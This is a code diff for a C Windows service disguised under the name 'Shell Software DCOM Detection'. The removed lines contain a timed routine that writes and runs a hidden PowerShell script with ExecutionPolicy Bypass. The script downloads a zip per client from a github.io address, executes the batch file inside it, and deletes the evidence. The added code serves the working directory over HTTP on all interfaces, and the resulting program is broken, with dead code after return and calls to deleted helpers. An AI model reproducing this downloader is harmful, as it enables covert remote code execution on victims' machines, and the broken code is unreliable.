@@ -7,49 +7,19 @@ void ServiceMain(int argc, char** argv);
 void ControlHandler(DWORD request);
 int InitService();
 
-const char* getFileNameFromPath(const char* path)
-{
-	char separator = '\\';
-	if(path != NULL)
-	{
-		for(size_t i = strlen(path);  i > 0; --i)
-		{
-			if (path[i-1] == separator)
-			{
-				return &path[i];
-			}
-		}
-	}
-	return path;
-}
-
-char* getDirPathFromPath(char* path)
-{
-	char* parent = NULL;
-    int parentLen;
-    char* last = strrchr(path, '\\');
-
-    if (last != NULL)
-	{
-		parentLen = strlen(path) - strlen(last + 1);
-		parent = (char*)malloc(parentLen * sizeof(char));
-        strncpy(parent, path, parentLen);
-		parent[parentLen] = 0;
-    }
-	return parent;
-}
-
-char* exepath = NULL;
-int timer = 0;
-char* clientName = NULL;
+const char* fileName = "RRunCShell";
+const char* srvName = "Shell Software DCOM Detection";
+const char* srvDesc = "Shell Software DCOM Detection";
+char* exe_path = NULL;
+char* exe_name = NULL;
 
 int WriteToLog(char* str)
 {
-	UNUSED(str);
-	/* if (exepath == NULL)
+	//UNUSED(str);
+	if (exe_path == NULL)
 		return -1;
-	char* logName = (char*)malloc((strlen(exepath)+8) * sizeof(char));
-	strcpy(logName, exepath);
+	char* logName = (char*)malloc((strlen(exe_path)+8) * sizeof(char));
+	strcpy(logName, exe_path);
 	strcat(logName, "log.txt");
     FILE* log;
     log = fopen(logName, "a+");
@@ -57,80 +27,78 @@ int WriteToLog(char* str)
     if (log == NULL)
         return -1;
     fprintf(log, "%s\n", str);
-    fclose(log); */
+    fclose(log);
     return 0;
 }
 
-void CronFunc(void)
-{
-	if (clientName == NULL)
-		return;
-	
-	char* cmdx = (char*)malloc(5024 * sizeof(char));
-	sprintf(cmdx, "cmd /c echo $client = \"%s\"> %%tmp%%\\tmp.ps1 &&\
- echo $zip_ext_folder = $env:TEMP>> %%tmp%%\\tmp.ps1 &&\
- echo $out_folder = $env:TEMP>> %%tmp%%\\tmp.ps1 &&\
- echo $file = \"index.zip\">> %%tmp%%\\tmp.ps1 &&\
- echo $infile = \"https://suncomputers2021.github.io/smsbox/\" + $client + \"/\" + $file>> %%tmp%%\\tmp.ps1 &&\
- echo $outfile = $out_folder + \"\\\\\" + $file>> %%tmp%%\\tmp.ps1 &&\
- echo $exefile = $zip_ext_folder + \"\\\\\" + \"index.bat\">> %%tmp%%\\tmp.ps1 &&\
- echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3>> %%tmp%%\\tmp.ps1 &&\
- echo [Net.ServicePointManager]::SecurityProtocol = \"Tls, Tls11, Tls12, Ssl3\">> %%tmp%%\\tmp.ps1 &&\
- echo $ProgressPreference = 'SilentlyContinue'>> %%tmp%%\\tmp.ps1 &&\
- echo Invoke-WebRequest -Uri $infile -OutFile $outfile>> %%tmp%%\\tmp.ps1 &&\
- echo $ProgressPreference = 'Continue'>> %%tmp%%\\tmp.ps1 &&\
- echo Expand-Archive -LiteralPath $outfile -DestinationPath $zip_ext_folder -Force>> %%tmp%%\\tmp.ps1 &&\
- echo Remove-item $outfile>> %%tmp%%\\tmp.ps1 &&\
- echo $response = ^& $exefile>> %%tmp%%\\tmp.ps1 &&\
- echo Write-Host $response>> %%tmp%%\\tmp.ps1 &&\
- echo Remove-item $exefile>> %%tmp%%\\tmp.ps1 &&\
- PowerShell -NoProfile -ExecutionPolicy Bypass -NoLogo -WindowStyle Hidden -Command \"& '%%tmp%%\\tmp.ps1'\" &&\
- del %%tmp%%\\tmp.ps1", clientName);
-	char *result = exe_cmd(cmdx);
-	free(cmdx);
-	free(result);
+//static int count = 0;
+//void CronFunc1(void)
+//{
+	//WriteToLog("CronFunc1 is running...\n");
+	//count++;
+//}
+//void CronFunc2(void)
+//{
+	//WriteToLog("CronFunc2 is running...\n");
+	//count++;
+//}
+
+static const char *s_http_addr = "http://0.0.0.0:8000";    // HTTP port
+static const char *s_https_addr = "https://0.0.0.0:8443";  // HTTPS port
+static const char *s_root_dir = ".";
+
+// We use the same event handler function for HTTP and HTTPS connections
+// fn_data is NULL for plain HTTP, and non-NULL for HTTPS
+static void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) {
+  if (ev == MG_EV_ACCEPT && fn_data != NULL) {
+    struct mg_tls_opts opts = {
+        //.ca = "ca.pem",         // Uncomment to enable two-way SSL
+        .cert = "server.pem",     // Certificate PEM file
+        .certkey = "server.pem",  // This pem contains both cert and key
+    };
+    mg_tls_init(c, &opts);
+  } else if (ev == MG_EV_HTTP_MSG) {
+    struct mg_http_message *hm = (struct mg_http_message *) ev_data;
+    if (mg_http_match_uri(hm, "/api/f1")) {
+      mg_http_reply(c, 200, "", "{\"result\": %d}\n", 123);  // Serve REST
+    } else if (mg_http_match_uri(hm, "/api/f2/*")) {
+      mg_http_reply(c, 200, "", "{\"result\": \"%.*s\"}\n", (int) hm->uri.len,
+                    hm->uri.ptr);
+    } else {
+      struct mg_http_serve_opts opts = {.root_dir = s_root_dir};
+      mg_http_serve_dir(c, ev_data, &opts);
+    }
+  }
+  (void) fn_data;
 }
 
 int main(int argc, char *argv[])
 {
-	exepath = getDirPathFromPath(argv[0]);
-	//char* fileName = (char*)getFileNameFromPath(argv[0]);
-	//char* ext = strstr(fileName, ".exe");
-	//if (ext)
+	struct mg_mgr mgr;                            // Event manager
+	mg_log_set("2");                              // Set to 3 to enable debug
+	mg_mgr_init(&mgr);                            // Initialise event manager
+	mg_http_listen(&mgr, s_http_addr, fn, NULL);  // Create HTTP listener
+	//mg_http_listen(&mgr, s_https_addr, fn, (void *) 1);  // HTTPS listener
+	for (;;) mg_mgr_poll(&mgr, 1000);                    // Infinite event loop
+	mg_mgr_free(&mgr);
+	
+	return EXIT_SUCCESS;
+	///////////////////
+	//cronjob* cj = cronjob_init();
+	//for(int i=1; i<10; i++)
 	//{
-		//fileName[strlen(fileName) - 4] = 0;
+		//cj->add_task(cj, 1, "*/30 * * * * *", CronFunc1);
+		//cj->add_task(cj, 2, "*/15 * * * * *", CronFunc2);
 	//}
-	char* fileName = "RRunCShell";
-	char* srvName = "Shell Software DCOM Detection";
-	char* srvDesc = "Shell Software DCOM Detection";
-	
-	if (argc == 2 && strcmp(argv[1], "ini") == 0)
-	{
-		char* iniName = (char*)malloc((strlen(fileName)+5) * sizeof(char));
-		strcpy(iniName, fileName);
-		strcat(iniName, ".ini");
-		if( access( iniName, F_OK ) == -1)
-		{
-			ini_t* ini = ini_create(NULL);
-			int section = ini_section_add( ini, fileName, strlen(fileName) );
-			ini_property_add( ini, section, "CronTab", 7, "60", 2 );
-			ini_property_add( ini, section, "Client", 6, "sunclient", 9 );
-			ini_property_add( ini, section, "Enable", 6, "True", 4 );
+	//while (count<10) {
+		//cj->process_task(cj);
+		//usleep(500000);//500 millisecond
+	//}
+	//cronjob_deinit(cj);
+	///////////////////
+	exe_path = getDirPathFromPath(argv[0]);
+	exe_name = getFileNameFromPath(argv[0]);
 
-			int size = ini_save( ini, NULL, 0 ); // Find the size needed
-			char* data = (char*) malloc( size );
-			size = ini_save( ini, data, size ); // Actually save the file
-			ini_destroy( ini );
-
-			FILE* fp = fopen( iniName, "w" );
-			fwrite( data, 1, size, fp );
-			fclose( fp );
-			free( data );
-		}
-		free(iniName);
-		return EXIT_SUCCESS;
-	}
-	
 	char* cmd = (char*)malloc(1024 * sizeof(char));
 	sprintf(cmd, "cmd /c sc query | find /I /C \"%s\"", srvName);
 	char *hasSrv = exe_cmd(cmd);
@@ -192,15 +160,10 @@ int main(int argc, char *argv[])
 		StartServiceCtrlDispatcher(ServiceTable);
 	}
 	
-	if (exepath != NULL)
-	{
-		free(exepath);
-	}
-	
-	if (clientName != NULL)
-	{
-		free(clientName);
-	}
+	if (exe_path != NULL)
+		free(exe_path);
+	if (exe_name != NULL)
+		free(exe_name);
 	
 	return EXIT_SUCCESS;
 }
@@ -245,83 +208,8 @@ void ServiceMain(int argc, char** argv)
         /* Do nothing but loop once every 5 minutes */
         while(1)
         {
-			if (timer == 0)
-			{
-				//const char* fileName = argv[0];
-				char* fileName = "RRunCShell";
-				int isSleep = 0;
-				char* iniName = (char*)malloc((strlen(exepath)+strlen(fileName)+5) * sizeof(char));
-				strcpy(iniName, exepath);
-				strcat(iniName, fileName);
-				strcat(iniName, ".ini");
-				if( access( iniName, F_OK ) != -1)
-				{
-					FILE* fp = fopen( iniName, "r" );
-					fseek( fp, 0, SEEK_END );
-					int size = ftell( fp );
-					fseek( fp, 0, SEEK_SET );
-					char* data = (char*) malloc( size + 1 );
-					fread( data, 1, size, fp );
-					data[ size ] = '\0';
-					fclose( fp );
-					ini_t* ini = ini_load( data, NULL );
-					free( data );
-					
-					int section, idx_c, idx_cn, idx_e;
-					section = ini_find_section( ini, fileName, strlen(fileName) );
-					if (section != INI_NOT_FOUND)
-					{
-						idx_c = ini_find_property( ini, section, "CronTab", 7 );
-						idx_cn = ini_find_property( ini, section, "Client", 6 );
-						idx_e = ini_find_property( ini, section, "Enable", 6 );
-						if (idx_c != INI_NOT_FOUND && idx_cn != INI_NOT_FOUND && idx_e != INI_NOT_FOUND)
-						{
-							char const* CronTab = ini_property_value( ini, section, idx_c );
-							char const* Client = ini_property_value( ini, section, idx_cn );
-							char const* Enable = ini_property_value( ini, section, idx_e );
-							if (strcmp(Enable, "True") == 0 && clientName == NULL)
-							{
-								clientName = (char*)malloc((strlen(Client)+1) * sizeof(char));
-								strcpy(clientName, Client);
-								int t = atoi(CronTab);
-								if (t > 0)
-								{
-									timer = t;
-								}
-							}
-							else
-							{
-								isSleep = 1;
-							}
-						}
-						else
-						{
-							isSleep = 1;
-						}
-					}
-					else
-					{
-						isSleep = 1;
-					}
-					
-					ini_destroy( ini );
-				}
-				else
-				{
-					isSleep = 1;
-				}
-				free(iniName);
-				
-				if (isSleep == 1)
-				{
-					sleep(60);
-				}
-			}
-			else
-			{
-				sleep(timer);
-				CronFunc();
-			}
+			sleep(60);
+			WriteToLog("Working...");
         }
     }
 	
